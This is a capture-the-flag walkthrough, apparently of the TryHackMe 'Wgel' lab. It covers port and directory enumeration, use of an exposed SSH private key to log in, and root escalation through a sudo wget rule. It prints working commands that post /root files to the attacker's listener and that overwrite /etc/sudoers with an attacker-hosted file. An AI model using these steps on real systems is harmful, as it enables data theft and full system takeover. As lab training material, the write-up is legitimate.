A. Enumeration

A.1 Nmap

```
┌[parrot]─[23:35-01/07]─[/home/glack/Desktop/THM/shellgen]
└╼glack$nmap -sV -sT -A 10.10.137.58                                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 23:35 IST
Nmap scan report for 10.10.137.58
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94961b66801b7648682d14b59a01aaaa (RSA)
|   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
|_  256 b90b972e459bf32a4b11c7831033e0ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.51 seconds
```

Nmap shows only two ports are open - 22 and 80

A.2 HTTP

Web server shows default installation of Apache

However I found this interesting comment in the source code of the index page

![[wgel source code.png]]

I found a potential username on the website "Jessie"

A.3 Directory Brute forcing

I Ran a feroxbuster command to checkout if there are any interesting directories

```
[parrot]─[23:35-01/07]─[/home/glack/Desktop/THM/shellgen]
└╼glack$feroxbuster -u http://10.10.137.58/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -n
```

breakdown of the command

-w - The wordlist i want to use
-u - the target URL
-n - Turn off recursive scanning

And i found this

```
http://10.10.137.58/sitemap

```

Then i scanned the ""/sitemap" and found these resources

```
301        9l       28w      321c http://10.10.137.58/sitemap/images
200      286l      755w    10346c http://10.10.137.58/sitemap/contact.html
200      312l      968w    12232c http://10.10.137.58/sitemap/about.html
200      312l     1020w    12745c http://10.10.137.58/sitemap/blog.html
200      516l     1786w    21080c http://10.10.137.58/sitemap/index.html
200      287l      803w    10131c http://10.10.137.58/sitemap/services.html
200      447l     1110w    17257c http://10.10.137.58/sitemap/shop.html
301        9l       28w      318c http://10.10.137.58/sitemap/css
200      328l      872w    11428c http://10.10.137.58/sitemap/work.html
301        9l       28w      317c http://10.10.137.58/sitemap/js
301        9l       28w      320c http://10.10.137.58/sitemap/fonts
301        9l       28w      319c http://10.10.137.58/sitemap/sass

```
 
Not that useful, however i did find another potential username in the blog section

![[wgel 2 dave username.png]]

With nothing much to go on, tried a different wordlist for directory brute force

```
[parrot]─[01:39-02/07]─[/usr/share/wordlists/seclists/Discovery/Web-Content]
└╼glack$sudo feroxbuster -u http://10.10.137.58/sitemap  -w /usr/share/wordlists/common.txt -t 50 -n
```

And we do find something usefull


```
http://10.10.137.58/sitemap/.ssh

```

On visiting the url we can see a rsa key file available 

![[wgel id_rsa.png]]

we download the file using

```
┌[parrot]─[01:42-02/07]─[/home/glack/Desktop/THM/wgel]
└╼glack$wget http://10.10.137.58/sitemap/.ssh/id_rsa
```

B. Gaining Access

We can use this key to ssh login into the target machine by using potential usernames - "dave" and "jessie"
 
We must not forget to change the permissions for "id_rsa" or we may encounter an error

```
┌[parrot]─[01:44-02/07]─[/home/glack/Desktop/THM/wgel]
└╼glack$chmod 600 id_rsa
```

we successfully log into the machine with jessie's username

```
┌[parrot]─[01:44-02/07]─[/home/glack/Desktop/THM/wgel]
└╼glack$ssh -i id_rsa jessie@10.10.137.58
```

We easily get the user flag 

![[wgel user flag.png]]

C. Privilege Escalation

We can check which commands can be run by jessie's user with sudo(root) privileges using the below command 

```
sudo -l
```

```
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```

We can see that we can run "wget" command to get the root flag and root shell. 

We can use GTFO bins to see the commands we can run for "sudo wget" for root shell, however they were not working so i tried a different method.

I discovered this method on thewriteup - https://sckull.github.io/postsl/wgel/
All credit goes to schkull

C.1 Root Flag

We can used the sudo command to post the contents of root.txt flag on our machine

First we start a listener on port 8000, which we can do by running the following:

```
┌[parrot]─[02:14-02/07]─[/home/glack/Downloads]
└╼glack$nc -lnvp 8000

```


And we post the contents of root flag using

```
sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.17.24.189:8000

```

and we get it easily

![[wgel root flag.png]]

C.2 Root Shell

Now we are not satisfied with just the root flag and would like to get he root shell

We create a file with the content - 
```

#jessie  ALL=(root) NOPASSWD: /usr/bin/wget
jessie  ALL=(ALL) NOPASSWD: ALL

```

Turn our machine into a webserver using

```
┌[parrot]─[02:22-02/07]─[/home/glack/Desktop/THM/wgel]
└╼glack$sudo python3 -m http.server 
```

We move to the /etc directory and download our file there, now this replaces the existing "sudoers" file with the one we created.

We use the below commands

```

jessie@CorpOne:~/Documents$ cd /etc

jessie@CorpOne:/etc$ sudo /usr/bin/wget 10.17.24.189:8000/sudoers --output-document=sudoers
```

And we can confirm this by using

```
jessie@CorpOne:/etc$ sudo -l
User jessie may run the following commands on CorpOne:
    (ALL) NOPASSWD: ALL
```


And we easily get the root shell

![[wgel Root shell.png]]

